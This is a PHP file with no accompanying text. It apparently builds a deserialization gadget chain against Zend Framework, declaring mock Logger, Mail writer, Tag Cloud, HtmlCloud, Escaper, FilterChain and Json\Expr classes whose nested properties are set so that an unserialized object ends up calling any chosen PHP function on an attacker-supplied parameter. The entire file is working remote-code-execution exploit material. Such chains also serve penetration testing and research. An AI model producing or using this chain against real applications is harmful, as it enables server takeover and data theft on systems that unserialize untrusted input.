<?php
namespace Zend\Log    {
    class Logger {
        protected $writers;

        function __construct($function, $param) {
            $this->writers = array(
                new \Zend\Log\Writer\Mail($function, $param)
            );
        }
    }
}

namespace Zend\Log\Writer {
    class Mail {
        protected $eventsToMail;
        protected $subjectPrependText;
        protected $numEntriesPerPriority;

        function __construct($function, $param) {
            $this->eventsToMail = array(0);
            $this->subjectPrependText = "";
            $this->numEntriesPerPriority = array(
                0 => new \Zend\Tag\Cloud($function, $param)
            );
        }
    }
}

namespace Zend\Tag  {
    class Cloud {
        protected $tags;
        protected $tagDecorator;

        function __construct($function, $param) {
            $this->tags = array("");
            $this->tagDecorator = new \Zend\Tag\Cloud\Decorator\HtmlCloud($function, $param);
        }
    }
}

namespace Zend\Tag\Cloud\Decorator {
    class HtmlCloud {
        protected $separator;
        protected $escaper;
        protected $htmlTags;

        function __construct($function, $param) {
            $this->separator = "";
            $this->htmlTags = array(
                "h" => array(
                    "a" => "!"
                )
            );
            $this->escaper = new \Zend\Escaper\Escaper($function, $param);
        }
    }
}

namespace Zend\Escaper {
    class Escaper {
        protected $htmlAttrMatcher;

        function __construct($function, $param) {
            $this->htmlAttrMatcher = array(
                new \Zend\Filter\FilterChain($function, $param),
                "filter"
            );
        }
    }
}

namespace Zend\Filter {
    class FilterChain {
        protected $filters;

        function __construct($function, $param) {
            $this->filters = new \SplFixedArray(2);
            $this->filters[0] = array(
                new \Zend\Json\Expr($param),
                "__toString"
            );
            $this->filters[1] = $function;
        }
    }
}

namespace Zend\Json {
    class Expr {
        protected $expression;

        function __construct($param) {
            $this->expression = $param;
        }
    }
}
